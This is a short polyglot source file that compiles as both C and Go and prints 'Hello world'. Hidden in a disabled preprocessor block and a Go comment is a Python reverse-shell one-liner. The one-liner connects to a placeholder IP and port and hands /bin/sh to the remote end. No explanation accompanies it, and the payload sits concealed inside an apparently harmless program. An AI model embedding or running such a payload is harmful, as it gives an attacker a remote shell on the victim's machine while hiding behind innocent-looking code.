//\
/*
#include <stdio.h>

#if 0

'python3' '-c' 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<insert-ip-here>",<insert-port-number>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

#endif
int main() {
    printf("Hello world!\n");

    return 0;
}
#if 0
//*/
package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}
//\
/*
#endif
//*/

